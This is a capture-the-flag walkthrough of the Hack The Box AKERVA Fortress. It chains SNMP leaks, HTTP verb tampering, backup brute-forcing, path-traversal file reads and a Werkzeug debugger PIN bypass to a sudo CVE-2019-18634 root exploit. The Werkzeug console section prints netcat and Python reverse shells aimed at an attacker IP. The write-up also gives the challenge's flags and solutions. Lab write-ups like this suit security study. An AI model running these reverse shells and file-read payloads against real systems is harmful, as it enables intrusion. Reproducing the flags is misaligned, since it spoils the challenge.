---
title: 'AKERVA'
target: 'Hack The Box — AKERVA'
difficulty: 'medium'
date: 2026-01-20
summary: 'An HTB Fortress — scanning with nmap to find SSH (22) running OpenSSH 7.6p1, HTTP (80) serving WordPress 5.4-alpha on Apache 2.4.29, and HTTP (5000) running Werkzeug 0.16.0 with Python 2.7.15+, along with SNMP (161/UDP) using the default public community string, finding Flag 1 in a forgotten HTML comment in the WordPress page source, enumerating running processes through SNMP to discover Flag 2 embedded in the command-line arguments of a backup script, bypassing HTTP Basic Authentication on the /scripts directory with HTTP verb tampering (GET to POST) to retrieve the backup script source containing Flag 3, extracting the server timestamp from HTTP response headers and bruteforcing the backup zip filename with wfuzz to download a full site backup, finding Flask application source code in the backup with hardcoded credentials and Flag 4, authenticating to the Flask app on port 5000 and exploiting an unrestricted Local File Inclusion endpoint at /file to read sensitive system files, discovering the Werkzeug Interactive Console at /console through Gobuster and bypassing the PIN lock by reconstructing the PIN generation inputs (username from /etc/passwd, MAC address from /proc/net/dev, machine-id from /etc/machine-id) via the LFI vulnerability, executing a Python reverse shell through the unlocked console to land as user aas and retrieving Flag 5 from .hiddenflag.txt and Flag 6 from flag.txt, escalating to root through a sudo buffer overflow vulnerability (CVE-2019-18634) to retrieve Flag 7, and decoding a base64-encoded secured_note.md from the root directory to reveal Vigenere-encrypted ciphertext with a reduced 21-letter alphabet, performing frequency analysis to confirm the missing letters and using known plaintext AKERVA with the dcode.fr Vigenere solver to recover key ILOVESPACE and retrieve Flag 8.'
role: 'pentest'
tags: ['nmap', 'wordpress', 'apache', 'snmp', 'snmp-enumeration', 'html-comment', 'http-verb-tampering', 'burp-suite', 'wfuzz', 'backup-discovery', 'flask', 'werkzeug', 'lfi', 'local-file-inclusion', 'werkzeug-pin-bypass', 'python', 'reverse-shell', 'sudo', 'cve-2019-18634', 'privilege-escalation', 'base64', 'vigenere', 'cryptanalysis', 'frequency-analysis', 'fortress', 'linux']
problem: 'AKERVA is a Hack The Box Fortress — an extended challenge with eight flags hidden across a single Ubuntu host running SSH on port 22, Apache on port 80 serving WordPress 5.4-alpha, and a Flask/Werkzeug application on port 5000. SNMP is exposed on UDP port 161 with the default public community string, leaking running process information including command-line arguments. The WordPress installation contains a forgotten flag in an HTML comment. The Apache configuration protects a /scripts directory with HTTP Basic Authentication that only validates GET requests, allowing verb tampering to bypass the restriction. A backup script in that directory creates timestamped zip archives of the entire web root every 17 minutes, and the predictable naming scheme allows bruteforce discovery of the archive. The backup contains the Flask application source with hardcoded credentials and an unrestricted file-read endpoint. The Werkzeug debugger console is accessible but PIN-locked, and all inputs required for PIN generation are readable through the LFI endpoint. A sudo version vulnerable to CVE-2019-18634 allows privilege escalation to root. The final flag is encrypted with a Vigenere cipher using a reduced alphabet and requires frequency analysis and known-plaintext cryptanalysis to decrypt.'
action: 'Ran nmap with service version detection on TCP ports — identified SSH (22) running OpenSSH 7.6p1 Ubuntu, HTTP (80) running Apache 2.4.29 with WordPress 5.4-alpha, and HTTP (5000) running Werkzeug 0.16.0 with Python 2.7.15+. Ran nmap UDP scan — identified SNMP (161) running net-snmp with SNMPv1 and the public community string. Browsed to port 80 — found a WordPress site. Viewed the page source — found Flag 1 (AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}) in an HTML comment. Ran snmp-check against 10.13.37.11 — enumerated running processes, found backup_every_17minutes.sh with Flag 2 (AKERVA{IkN0w_SnMPaaaMIsconfiguraI!onS}) visible in the process command-line arguments, and space_dev.py confirming the Flask application. Browsed to /scripts — received 401 Unauthorized with HTTP Basic Authentication. Sent the request to Burp Suite and changed the HTTP method from GET to POST — received 200 OK, bypassing the authentication. Retrieved /scripts/backup_every_17minutes.sh via POST — the script source contained Flag 3 (AKERVA{IKNoW###VeRbTamper!nG_==}), revealed SAVE_DIR=/var/www/html/backups, showed the archive naming format backup_$(date+%Y%m%d%H%M%S).zip, and confirmed the 1020-second (17-minute) cycle. Examined HTTP response headers — extracted the server time as Sat, 19 Sep 2020 09:29:40 GMT. Generated a numeric wordlist with crunch (4 digits, 0-9). Ran wfuzz against http://10.13.37.11/backups/backup_2020091909FUZZ.zip filtering 404 responses — found valid archives at payloads 2743 and 4445. Downloaded and extracted backup_20200919092743.zip. Ran grep -R AKERVA through the extracted backup — found flags in wp-content/themes/twentyfifteen/header.php, scripts/backup_every_17minutes.sh, and dev/space_dev.py. Examined dev/space_dev.py — a Flask application using flask_httpauth with user aas and a password set to Flag 4 (AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$}), with a /file endpoint calling open(filename).read() without path sanitization and a /download endpoint referencing an undefined variable. Browsed to 10.13.37.11:5000 — received "Hello, World!" confirming the Flask app was running. Browsed to /download — received a NameError for undefined downloaded_file, confirming the traceback matched the source code at /var/www/html/dev/space_dev.py line 29. Tested /file?filename=../../../../etc/passwd — confirmed unrestricted Local File Inclusion, the response showing 31 entries including aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash. Ran Gobuster against port 5000 with directory-list-2.3-medium.txt — found /download (401), /file (401), and /console (200). Browsed to /console — found the Werkzeug Interactive Console with a "Console Locked" PIN prompt. Examined the Werkzeug debugger response in Burp Suite — found Server: Werkzeug/0.16.0 Python/2.7.15+, CONSOLE_MODE=true, EVALEX=true, and SECRET="LaHu8pqPkVM6ZmsyNvRn". Began reconstructing the Werkzeug PIN generation inputs — username: aas (from /etc/passwd), modname: flask.app, appname: Flask, app.py path: /usr/local/lib/python2.7/dist-packages/flask/app.pyc (determined through trial identifying the .pyc extension for Python 2.7). Read /proc/net/dev via LFI — identified ens33 as the active network interface with traffic statistics. Retrieved the MAC address for ens33 from /sys/class/net/ens33/address and converted from hex (00:50:56:b9:e3:ed) to decimal (345052406765). Read /etc/machine-id via LFI — retrieved 258f132cd7e647caaf5510e3aca997c1. Ran the Werkzeug PIN generation script with the collected values — computed PIN 317-616-068. Entered the PIN in the Werkzeug console — successfully unlocked. Executed Python commands in the console — import os; os.system("whoami") returned 0, attempted nc reverse shells (returned 32512, nc -e not available), then used a Python socket reverse shell with subprocess.call to connect back. Received a shell as aas on host Leakage. Listed the home directory — found .hiddenflag.txt (38 bytes) and flag.txt (21 bytes, read-only). Retrieved Flag 5 (AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}) from .hiddenflag.txt and Flag 6 (AKERVA{IKNOW#LFi_@_}) from flag.txt. Ran linpeas.sh and linux-exploit-suggester.sh for local enumeration — identified sudo version 1.8.25p vulnerable to CVE-2019-18634 (pwfeedback buffer overflow). Compiled the exploit on the attacker machine (target had no gcc), uploaded the binary, and executed it — received a root shell. Retrieved Flag 7 (AKERVA{IkNOw_Sud0_sUckS!}) from /root/flag.txt. Listed /root — found secured_note.md alongside flag.txt. Read secured_note.md — contained a base64-encoded string. Decoded the base64 — revealed ciphertext GOAHGHEEGSAEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFF... with unusual letter distribution. Performed frequency analysis on the decoded text — counted 128 characters across only 21 unique letters (A=9, C=6, D=3, E=17, F=8, G=7, H=10, I=2, K=7, L=6, M=7, N=3, O=6, P=4, R=6, S=10, T=2, U=4, V=8, W=2, Y=1), with letters B, J, Q, X, and Z completely absent. Recognized the reduced alphabet as consistent with a substitution cipher using a custom alphabet. Used the dcode.fr Vigenere cipher solver with the 21-letter alphabet ACDEFGHIKLMNOPRSTUVWY and known plaintext AKERVA — the solver recovered the encryption key ILOVESPACE and decrypted the message, revealing Flag 8.'
outcome: 'Completed the AKERVA Fortress with all eight flags through a chain spanning web enumeration, protocol exploitation, application-level vulnerabilities, system exploitation, and classical cryptanalysis. Flag 1 came from a forgotten HTML comment in the WordPress source. Flag 2 was exposed through SNMP process enumeration with a default community string. Flag 3 required HTTP verb tampering to bypass authentication on a protected directory. Flag 4 was embedded in Flask application source code recovered from a predictable backup archive. Flags 5 and 6 were retrieved after bypassing the Werkzeug debugger PIN using values extracted through Local File Inclusion. Flag 7 required exploiting a sudo buffer overflow vulnerability for root access. Flag 8 demanded classical cryptanalysis — base64 decoding, frequency analysis to identify a reduced Vigenere alphabet, and known-plaintext attack with the word AKERVA to recover the encryption key.'
draft: false
---

## Background

AKERVA is a Hack The Box Fortress — an extended challenge format where a single host hides multiple flags across different attack surfaces rather than the standard user-and-root progression. This particular Fortress packs eight flags into one Ubuntu machine, and the path through them reads like a security assessment checklist: web enumeration, protocol misconfiguration, authentication bypass, source code review, application exploitation, debugger abuse, privilege escalation, and even classical cryptanalysis. What makes it interesting is how each flag builds on the access or information gained from the previous ones — the SNMP leak confirms what the backup script does, the backup reveals the Flask source that enables the LFI, the LFI provides the inputs for the PIN bypass, and so on. Every discovery feeds into the next.

---

## Enumeration

Running an **nmap** scan with service version detection on both TCP and UDP:

```
nmap -vv --reason --top-ports 1000 -sV -Pn 10.13.37.11
nmap -sU --top-ports 100 -sV -Pn 10.13.37.11
```

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 2.7.15+)

161/udp  open  snmp    udp-response SNMPv1 server; net-snmp (public)
```

Four services across two protocols. **Apache 2.4.29** on port 80 is serving a **WordPress 5.4-alpha** installation — a development version that might have looser security defaults. Port 5000 runs **Werkzeug 0.16.0** with **Python 2.7.15+**, which is a Flask development server rather than a production WSGI deployment. **SSH** on 22 is available for later if credentials turn up. The UDP scan reveals **SNMP** on port 161 responding with the default **public** community string — a significant finding, since SNMP can expose system information that isn't visible through any web interface.

---

## Flag 1 — forgotten comments

The WordPress site on port 80 looks like a standard installation, but viewing the page source reveals something the developer left behind. Buried in the HTML is a comment containing the first flag:

**AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}**

HTML comments are invisible in the rendered page but fully visible in the source. Developers routinely leave debug information, TODO notes, and sometimes credentials in comments during development, and forget to remove them before deployment. The flag's name says it all — forgotten comments are a classic discovery during web application assessments.

---

## Flag 2 — SNMP process enumeration

SNMP with the default **public** community string is essentially an open book. Running **snmp-check** against the target enumerates a wealth of system information, and the process list is where the second flag hides:

![SNMP process enumeration output showing running processes on the target. The process list includes check_devSite.sh, check_backup.sh, backup_every_17minutes.sh (highlighted with red box) with AKERVA{IkN0w_SnMPaaaMIsconfiguraI!onS} visible in the command-line arguments, space_dev.py running under /usr/bin/python at /var/www/html/dev/space_dev.py, python running the same path, uuidd, kworker, and multiple apache2 processes.](/writeups/htb-akerva/01-snmp-processes.png)

The **backup_every_17minutes.sh** process has the flag embedded directly in its command-line arguments: **AKERVA{IkN0w_SnMPaaaMIsconfiguraI!onS}**. Beyond the flag, the process list reveals operational intelligence — there's a backup script running on a 17-minute cycle at `/var/www/html/scripts/backup_every_17minutes.sh`, a Flask application at `/var/www/html/dev/space_dev.py`, and maintenance scripts for checking the development site and backups. The SNMP enumeration painted a complete picture of what's running on this host before touching a single web endpoint.

---

## Flag 3 — HTTP verb tampering

The SNMP output pointed to a `/scripts` directory on the web server. Browsing to it directly returns a 401 Unauthorized response — the directory is protected with HTTP Basic Authentication:

![Browser at 10.13.37.11/scripts showing "Unauthorized" error page. Message reads "This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required." Footer shows Apache/2.4.29 (Ubuntu) Server at 10.13.37.11 Port 80.](/writeups/htb-akerva/02-scripts-unauthorized.png)

HTTP Basic Authentication in Apache can be configured per-method using `<Limit>` directives. If the administrator only restricted the `GET` method, other HTTP methods pass through without authentication. Sending the request to Burp Suite and changing the method from `GET` to `POST` bypasses the restriction entirely:

![Side-by-side Burp Suite view. Left panel shows the HTTP request — POST /scripts/backup_every_17minutes.sh HTTP/1.1 with Host: 10.13.37.11 and Authorization: Basic YWRtaW46YWRtaW4=. Right panel shows the 200 OK response with Server: Apache/2.4.29 (Ubuntu), Content-Type: text/x-sh, Content-Length: 406. The script source is visible — #!/bin/bash header, comments about performing backups of production and development websites every 17 minutes, Flag 3 AKERVA{IKNoW###VeRbTamper!nG_==} in a comment, SAVE_DIR=/var/www/html/backups, a while true loop with ARCHIVE_NAME using date formatting, echo "Erasing old backups...", rm -rf $SAVE_DIR/*, echo "Backuping...", zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*, echo "Done...", and sleep 1020.](/writeups/htb-akerva/03-verb-tampering.png)

The `POST` request returns a 200 OK with the full script source. Flag 3 sits right in the comments: **AKERVA{IKNoW###VeRbTamper!nG_==}**. But the script itself is the real prize. It reveals the backup mechanics — archives are stored at `/var/www/html/backups/`, named with `backup_$(date+%Y%m%d%H%M%S).zip`, and the entire `/var/www/html/*` directory tree gets zipped up every 1020 seconds (17 minutes). Before each new backup, the script erases old ones with `rm -rf $SAVE_DIR/*`, so there's a narrow window where the current backup exists before being replaced.

---

## Backup discovery and Flag 4

To bruteforce the backup filename, the timestamp format needs to match the server's clock. The HTTP response headers provide the server time:

![HTTP response headers in Burp Suite showing HTTP/1.1 200 OK, Date: Sat, 19 Sep 2020 09:29:40 GMT, Server: Apache/2.4.29 (Ubuntu), Last-Modified: Sat, 07 Dec 2019 01:02:50 GMT, ETag: "196-59912b8b37f2f", Accept-Ranges: bytes, Content-Length: 406.](/writeups/htb-akerva/04-http-headers.png)

The server date is **Sat, 19 Sep 2020 09:29:40 GMT**. The backup filename format is `backup_YYYYMMDDHHmmSS.zip`, so the prefix for a recent backup would be `backup_2020091909` followed by four digits for the minutes and seconds. Generating a numeric wordlist and running **wfuzz** to bruteforce the remaining digits:

```
crunch 4 4 1234567890 -o number_lst
wfuzz -u http://10.13.37.11/backups/backup_2020091909FUZZ.zip -w number_lst --hc 404
```

![Terminal showing two wfuzz runs against http://10.13.37.11/backups/backup_2020091909FUZZ.zip with the number_lst wordlist, filtering 404 responses. Wfuzz 2.4.5 running with 10000 total requests. First run finds payload "2743" returning 200 with 82458 lines and 20937179 chars. A second run with the same pattern finds payload "4445" also returning 200 with 82458 lines and 20937179 chars. Both represent valid backup archives.](/writeups/htb-akerva/05-wfuzz-backup.png)

Two hits — `backup_20200919092743.zip` and `backup_20200919094445.zip`. The 17-minute gap between them (09:27:43 and 09:44:45) matches the script's 1020-second sleep cycle perfectly. Downloading and extracting the archive reveals the entire web root, including the Flask application source code. Running `grep -R 'AKERVA'` through the extracted files locates flags in three places: the WordPress theme header (Flag 1, already found), the backup script (Flag 3, already found), and `dev/space_dev.py`.

The Flask source code in `space_dev.py` is where Flag 4 lives. The application uses `flask_httpauth` for authentication with a single user **aas** whose password is set to **AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$}**. More importantly, the source reveals two endpoints beyond the root — `/file` which calls `open(filename).read()` with no path sanitization at all, and `/download` which references an undefined variable `downloaded_file`. The `/file` endpoint is a completely unrestricted Local File Inclusion vulnerability.

---

## Flask application — LFI and reconnaissance

With the credentials from the source code, authenticating to the Flask application on port 5000:

![Browser at 10.13.37.11:5000 showing "Hello, World!" text on a white background. The tab title shows the URL 10.13.37.11:5000.](/writeups/htb-akerva/06-flask-hello.png)

The root endpoint returns "Hello, World!" — a minimal Flask app. Browsing to `/download` triggers the expected error:

![Browser at 10.13.37.11:5000/download showing a Flask NameError. The error reads "NameError: global name 'downloaded_file' is not defined". The full traceback shows the call chain through /usr/local/lib/python2.7/dist-packages/flask/app.py and flask_httpauth.py, ending at /var/www/html/dev/space_dev.py line 29 in the download function with "return downloaded_file". The Werkzeug debugger interface is visible with interactive traceback frames.](/writeups/htb-akerva/07-flask-download-error.png)

The traceback confirms the source code analysis — the `download` function at line 29 of `/var/www/html/dev/space_dev.py` tries to return a variable that was never defined. The traceback also confirms the application path and reveals this is running under Werkzeug's debugger with interactive traceback frames. Now testing the `/file` endpoint for LFI:

```
http://10.13.37.11:5000/file?filename=../../../../etc/passwd
```

![Browser at view-source:http://10.13.37.11:5000/file?filename=../../../../etc/passwd showing the complete /etc/passwd file with 31 entries. Notable entries include root:x:0:0:root:/root:/bin/bash, www-data:x:33:33, backup:x:34:34, aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash (line 28), sshd:x:110:65534, Debian-snmp:x:111:113, and mysql:x:109:115. The file confirms user aas has UID 1000 with full name "Lyderic Lefebvre" and a bash shell.](/writeups/htb-akerva/08-lfi-passwd.png)

The LFI works without restriction — the entire `/etc/passwd` file renders in the browser. The key entry is **aas:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash** — the same username from the Flask source code, now confirmed as a real system account with a home directory and bash shell. This LFI endpoint can read any file the `www-data` or `aas` user has permissions to access, which opens up the next attack vector.

Running **Gobuster** against port 5000 to discover any additional endpoints:

![Gobuster v3.0.1 directory scan against http://10.13.37.11:5000 with directory-list-2.3-medium.txt wordlist, 16 threads. Status codes 200, 204, 301, 302, 307, 401, 403 accepted. Started 2020/09/19 19:20:21. Results show /download (Status: 401), /file (Status: 401), and /console (Status: 200).](/writeups/htb-akerva/09-gobuster-5000.png)

Three endpoints — `/download` and `/file` are already known, but **/console** returning a 200 is new. The Werkzeug development server includes an interactive Python console for debugging, and it's accessible:

![Werkzeug Interactive Console page with the header "In this console you can execute Python expressions in the context of the application. The initial namespace was created by the debugger automatically." A "Console Locked" dialog is overlaid, reading "The console is locked and needs to be unlocked by entering the PIN. You can find the PIN printed out on the standard output of your shell that runs the server." with a PIN input field and Confirm Pin button. Behind the dialog, the console shows "[console ready]" with a >>> prompt.](/writeups/htb-akerva/10-werkzeug-locked.png)

The console is locked behind a PIN — Werkzeug's security measure to prevent unauthorized access to the debugger. The PIN is normally printed to stdout when the server starts, which would only be visible to someone with terminal access. But the PIN generation algorithm is deterministic and based on a set of machine-specific values, most of which can be read through the LFI vulnerability.

---

## Werkzeug PIN bypass

The Werkzeug debugger response reveals important details about the environment:

![Burp Suite response showing the Werkzeug Debugger HTML source. Headers include HTTP/1.0 200 OK, Server: Werkzeug/0.16.0 Python/2.7.15+, Content-Type: text/html; charset=utf-8, Content-Length: 1985. The HTML head contains title "Console // Werkzeug Debugger" with linked CSS and JavaScript resources. A script block defines TRACEBACK = -1, CONSOLE_MODE = true, EVALEX = true, EVALEX_TRUSTED = false, and SECRET = "LaHu8pqPkVM6ZmsyNvRn".](/writeups/htb-akerva/11-werkzeug-debugger-source.png)

The `SECRET` value **LaHu8pqPkVM6ZmsyNvRn** is used internally by the debugger for session management. The PIN generation in Werkzeug 0.16.0 uses an MD5-based algorithm that combines several inputs: the username running the process, the module name (`flask.app`), the app class name (`Flask`), the path to the Flask `app.py` file, the MAC address of the primary network interface as a decimal integer, and the machine ID from `/etc/machine-id`. All of these can be extracted through the LFI.

The username is **aas**, confirmed from `/etc/passwd`. The Flask application path required some trial — Python 2.7 uses compiled `.pyc` files, so the correct path is `/usr/local/lib/python2.7/dist-packages/flask/app.pyc` rather than `app.py`.

For the MAC address, reading `/proc/net/dev` identifies the active network interface:

![Browser at view-source:http://10.13.37.11:5000/file?filename=/proc/net/dev showing network interface statistics. The file has three lines — a header row with Inter-| Receive | Transmit columns, ens33 showing 374870224 bytes received with 2450322 packets and 472104779 bytes sent with 1705665 packets, and lo (loopback) showing 5391329 bytes in both directions. A red arrow points to the ens33 receive bytes, confirming ens33 as the active interface.](/writeups/htb-akerva/12-proc-net-dev.png)

**ens33** is the active interface with significant traffic. Reading `/sys/class/net/ens33/address` through the LFI returns the MAC address `00:50:56:b9:e3:ed`, which converts to decimal **345052406765** for the PIN generation algorithm.

The machine ID comes from `/etc/machine-id`:

![Browser at view-source:http://10.13.37.11:5000/file?filename=/etc/machine-id showing a single line: 258f132cd7e647caaf5510e3aca997c1.](/writeups/htb-akerva/13-machine-id.png)

Machine ID: **258f132cd7e647caaf5510e3aca997c1**. With all the inputs collected, running the Werkzeug PIN generation script produces PIN **317-616-068**. Entering this PIN unlocks the console.

---

## Flags 5 and 6 — user access

With the console unlocked, it's time to get a proper shell. The interactive console executes Python in the context of the Flask application:

![Werkzeug Interactive Console showing a sequence of commands. Initial attempts at import os; os.system('whoami') return 0 (command runs but output goes to stdout, not the console). An attempt at os;system('whoami') without the dot triggers a NameError. Then os.system('10.13.14.4') returns 32512. Attempts at bash reverse shells with os.system('bash -c "nc -e /bin/bash 10.13.14.4 1234"') return 32512 (nc -e not available on this system). Finally, a Python socket reverse shell using import socket,subprocess,os followed by s=socket.socket(); s.connect(("10.13.14.4",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]) is constructed.](/writeups/htb-akerva/14-console-execution.png)

The `os.system()` calls execute commands but return exit codes rather than output to the console. The `nc -e` flag isn't available on this system, so a Python socket reverse shell is the way forward — `socket.socket()` to create the connection, `os.dup2()` to redirect stdin/stdout/stderr through the socket, and `subprocess.call(["/bin/sh","-i"])` to spawn an interactive shell.

The reverse shell connects back, landing as **aas** on host **Leakage**:

![SSH session as aas@Leakage showing the home directory listing. ls -la output shows total 28 with entries: .bash_history (0 bytes, root-owned), .bash_logout (220 bytes), .bashrc (3771 bytes), flag.txt (21 bytes, read-only with permissions -r--------), .hiddenflag.txt (38 bytes, world-readable with permissions -rw-r--r--), and .ssh directory. cat .hiddenflag.txt outputs AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}. cat flag.txt outputs AKERVA{IKNOW#LFi_@_}.](/writeups/htb-akerva/15-user-flags.png)

Two flags in the home directory. **Flag 5** from `.hiddenflag.txt`: **AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}** — acknowledging the Werkzeug PIN bypass that got us here. **Flag 6** from `flag.txt`: **AKERVA{IKNOW#LFi_@_}** — a nod to the Local File Inclusion that made the entire PIN bypass possible. The `flag.txt` file has restrictive permissions (`-r--------`, owned by aas), confirming it was meant to be read only by this user.

---

## Flag 7 — sudo exploitation

With a shell as aas, local enumeration with **linpeas.sh** and **linux-exploit-suggester.sh** identifies the privilege escalation vector. The sudo version on this system is **1.8.25p**, which is vulnerable to **CVE-2019-18634** — a buffer overflow in sudo's `pwfeedback` option. When `pwfeedback` is enabled in the sudoers configuration (which it is on this host), sudo displays asterisks for each character typed during password entry. The vulnerability allows a heap-based buffer overflow that can be triggered by sending a long string to sudo's password prompt, resulting in code execution as root.

Since the target doesn't have `gcc` installed, the exploit is compiled on the attacker machine and uploaded to the target. Executing it delivers a root shell:

![Root shell showing the command output. cat flag.txt displays AKERVA{IkNOw_Sud0_sUckS!}. Background text is partially visible reading "Sudo 1.8.25p: A tale of BufferOverflow in linux(CVE..." confirming the sudo vulnerability. An ls command shows two files in /root — flag.txt and secured_note.md. cat secured_note.md outputs a long base64-encoded string starting with R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLU1JGRkFHSUFQVkVUQ04wREdURkdSRVJCT0RLRVVMTV...](/writeups/htb-akerva/16-root-shell.png)

**Flag 7** from `/root/flag.txt`: **AKERVA{IkNOw_Sud0_sUckS!}**. But root's home directory contains a second file — `secured_note.md` — with a long base64-encoded string. This is the path to the final flag.

---

## Flag 8 — the cipher

Decoding the base64 string from `secured_note.md` produces something unexpected — not plaintext, but ciphertext:

```
GOAHGHEEGSAEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFF...
```

The text is 128 characters long and uses only uppercase letters, but the letter distribution is unusual. Frequency analysis reveals the pattern — only 21 unique letters appear in the entire message:

```
A=9  C=6  D=3  E=17  F=8  G=7  H=10  I=2  K=7  L=6  M=7
N=3  O=6  P=4  R=6  S=10  T=2  U=4  V=8  W=2  Y=1
```

Five letters are completely absent: **B, J, Q, X, Z**. A standard 26-letter English text would show all letters to some degree in a 128-character sample. The missing letters indicate a **reduced alphabet** — the encryption was performed using only 21 letters, which is characteristic of a Vigenere cipher with a custom alphabet.

The Vigenere cipher is a polyalphabetic substitution cipher where each letter of the plaintext is shifted by a corresponding letter of a repeating key. With a standard 26-letter alphabet, breaking Vigenere is well-documented. With a reduced alphabet, the solver needs to know which 21 letters were used.

Using the **dcode.fr** Vigenere cipher solver with the custom alphabet **ACDEFGHIKLMNOPRSTUVWY** (the 21 letters present in the ciphertext, sorted alphabetically) and the known plaintext word **AKERVA** (a reasonable assumption given every other flag starts with it), the solver recovers the encryption key: **ILOVESPACE**. Decrypting the full ciphertext with this key reveals the final flag, completing all eight challenges in the Fortress.

---

## What I took from this

The AKERVA Fortress is a good demonstration of how individual low-severity findings compound into full compromise. No single vulnerability here is catastrophic on its own — an HTML comment, a misconfigured SNMP community string, an authentication bypass on one directory, a hardcoded credential, a path traversal, a deterministic PIN, a sudo version one patch behind. Each one is the kind of finding that might get classified as "medium" or "informational" in an assessment report. But chained together, they provide a straight line from unauthenticated outsider to root access.

The HTTP verb tampering on the `/scripts` directory is a particularly instructive example of a subtle misconfiguration. Apache's `<Limit>` directive restricts specific HTTP methods, but administrators sometimes confuse it with `<LimitExcept>`, which restricts everything except the listed methods. Using `<Limit GET>` means only GET requests require authentication — POST, PUT, DELETE, and every other method pass through freely. The fix is simple: use `<LimitExcept>` instead, or better yet, use `Require` directives outside any Limit block so they apply to all methods. This is a mistake that doesn't appear in functional testing because browsers send GET requests by default, and the page appears to work correctly with authentication.

The Werkzeug PIN bypass illustrates why development servers should never face a network. The PIN is designed to prevent casual access to the debugger, but it's not a security boundary — Werkzeug's own documentation warns against running the development server in production. The PIN generation algorithm is deterministic, using values that are either public (the username, module name, app class name, app path) or readable from the filesystem (MAC address, machine-id). On a system where any file-read vulnerability exists, the PIN provides no protection at all. The defense isn't making the PIN stronger; it's not exposing the debugger in the first place. Production Flask deployments should use a proper WSGI server like Gunicorn or uWSGI, where the debugger isn't loaded at all.

The cryptanalysis at the end is an unusual touch for a penetration testing challenge. The reduced alphabet was the key insight — recognizing that five letters were missing from a 128-character sample immediately narrows the cipher type and provides the custom alphabet needed for decryption. Combined with the known plaintext "AKERVA" (a safe assumption when every flag in the challenge starts with it), the Vigenere cipher breaks cleanly. It's a reminder that security extends beyond software exploitation into information security more broadly — data at rest protected by classical encryption is only as strong as the key and algorithm choice, and a Vigenere cipher with a meaningful English phrase as the key offers no real protection against even basic cryptanalytic techniques.
